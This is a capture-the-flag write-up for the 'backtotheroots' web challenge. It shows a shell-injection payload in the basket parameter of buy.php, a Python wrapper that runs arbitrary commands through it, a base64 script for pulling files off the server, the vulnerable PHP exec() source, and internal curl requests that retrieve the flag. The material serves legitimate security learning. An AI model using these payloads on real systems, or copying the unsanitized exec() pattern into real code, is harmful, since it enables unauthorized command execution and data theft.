# backtotheroots

[library.m0unt41n.ch/challenges/backtotheroots](https://library.m0unt41n.ch/challenges/backtotheroots) ![](../../resources/web.svg) ![](../../resources/medium.svg) 

# TL;DR

Remote-only challenge. We get access to a mostly-client-side PHP application, with
the single dynamic point being a `GET /buy.php` request, with a shell injection on the
`basket` parameter. From there, download the source and figure out the flag from there.

# First look

The app has three endpoints:

*   `GET /index.php` - list of three products, with buttons to add them to the cart.
*   `GET /checkout.php` - shows the basket and `BUY` / `CLEAR` buttons
*   `GET /buy.php?basket=[{"qty":N,"cost":X,"name":"NAME"},...]` - "executes" the purchase.

Some more details

*   The cart's JSON is stored as an unencrypted `basket` cookie.
*   We can't add the flag to the cart (`Out of stock` &#128578;)
*   Attempt to `BUY` results with `Payment is not implemented` alert.

All the verifications happen with client-side JS, so it is easy to go around all these
blocks by just changing variables or functions from the console. Or editing the cookie.
But, no matter what, the best we can see after sending, e.g.

```
/buy.php?basket=[{"qty":0,"cost":0,"name":"flower"},{"qty":0,"cost":0,"name":"tree"},{"qty":1,"cost":99999,"name":"flag"}]
```

...is (with some formatting):

```html
<html>
  <body onload="if(document.body.innerHTML.indexOf('THIS_IS_THE_TESTSECRET') > -1){alert('Thanks for your purchase, your package will be shipped somewhere!');window.location.href = '/'}">
    Returned with status 0 and output:
    <pre>
      Parcel shipment script has been started. Please wait for it to arrive. The following will be sent:
      <br><br>
      [
        {"qty":0,"cost":0,"name":"flower"},
        {"qty":0,"cost":0,"name":"tree"},
        {"qty":1,"cost":99999,"name":"flag"}
      ]
      <br></pre>
      <pre>Getting Secret from the external Flag storage Vault and submitting everything to the logistics company.
      If you see the test Secret below, it worked and your package will arrive soon!
    </pre>
  </body>
</html>
THIS_IS_THE_TESTSECRET
<br>
```

All that without any additional communication in the `Network` tab of the browser debug tools.

(Just for completness: the PNG files don't contain any obvious hidden information / stego payloads either).

# Exploiting `GET /buy.php?basket=`

The only variable in the app seems to be the `buy.php` handler. Playing around with `curl`, I gradually figured out that:

*   The `basket` parameter seems to be passed mostly **verbatim** - it does not have to be JSON, it will
    almost always show up in above HTML

*   **Not** sending `basket` urlparam results in:<br>
    `Undefined array key "basket" in /var/www/html/buy.php on line 6`

*   A single `'` quote in the `basket` param **generates `status 2`** and no result between `<br>` tags. Otherwise, **the status is `0`**.

*   This hints at some sort of injection. Playing with that further, I ended up with `/buy.php?basket='%27'%3Bls%27` - which **looks like shell injection** indeed!

    ```
    Returned with status 0 and output:
    Parcel shipment script has been started. Please wait for it to arrive. The following will be sent:
    buy.php checkout.php flag.png flower.png index.php tree.png
    Getting Secret from the external Flag storage Vault and submitting everything to the logistics company. If you see the test Secret below, it worked and your package will arrive soon!
    THIS_IS_THE_TESTSECRET
    ```

    So, we see files: `buy.php`, `checkout.php`, `flag.png`, `flower.png`, `index.php` and `tree.png`.

*   We can create a small wrapper around this:

    ```python
    import requests
    import urllib.parse

    URL = "https://219a9ce1-4c5f-4173-8d21-9c580671dcfd.library.m0unt41n.ch:1337"

    def RunCmd(cmd):
        url = URL + "/buy.php?basket="+urllib.parse.quote("';"+cmd+"'")
        return requests.get(url).text[339:-243]
    
    print(runCmd("ls"))
    ```

    (the `[339:-243]` offsets are empirical, from above strings - they return just the part between `<pre>` tags)

*   Now, this allows `cat` on files, but PHP eval / execution is guaranteed to lose some
    nuances like newlines, string boundaries, etc. As we have shell access, it's better to
    fetch the files encoded to a known-plaintext format. With that, the exfil script:

    ```python
    import base64

    def GetFile(name):
        s = RunCmd("base64 "+name)
        open(name, "wb").write(base64.b64decode(s))

    for name in RunCmd("ls").split(" "):
        print("Fetching: "+name)
        GetFile(name)
    ```
  
All this gets us complete server-side PHP source of the app.

# The code

Looking at the source, `index.php` and `checkout.php` are confirmed to be pure HTML files (no PHP code). `buy.php` though:

```php
$a=[];
$output=null;
$retval=null;
echo '<html><body onload="if(document.body.innerHTML.indexOf(\'THIS_IS_THE_TESTSECRET\') > -1){alert(\'Thanks for your purchase, your package will be shipped somewhere!\');window.location.href = \'/\'}">';
exec('echo \'Parcel shipment script has been started. Please wait for it to arrive. The following will be sent:\n\n \'$(echo \''.$_GET['basket'].'\' 2>&1)', $output, $retval);
echo "Returned with status $retval and output:\n";
echo "<pre>";
foreach ($output as $item) {
    echo $item . "<br>";
}
echo "</pre><pre>Getting Secret from the external Flag storage Vault and submitting everything to the logistics company. If you see the test Secret below, it worked and your package will arrive soon!</pre></body></html>";

$a=[];
$output=null;
$retval=null;
exec('curl http://backtotheroots-secret/testsecret.php', $output, $retval);
foreach ($output as $item) {
    echo $item . "<br>";
}
```

The first `exec()` explains the shell injection. Let's play with the second one.

*   `print(RunCmd("curl -Ls http://backtotheroots-secret/testsecret.php"))`

    ```
    THIS_IS_THE_TESTSECRET
    ```

*   `print(RunCmd("curl -Ls http://backtotheroots-secret/"))`

    ```html
    <html><body>Welcome to the internal secret store, as it's not reachable from external networks, all your secrets are safe here!<br><br><a href='testsecret.php'>TEST</a><br><a href='flag.php'>FLAG</a></body></html>
    ```

*   `print(RunCmd("curl -Ls http://backtotheroots-secret/flag.php"))`

    ... gets the flag &#128578;

---

## `stairctf{Glad_we_dont_build_websites_like_that_anymore}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
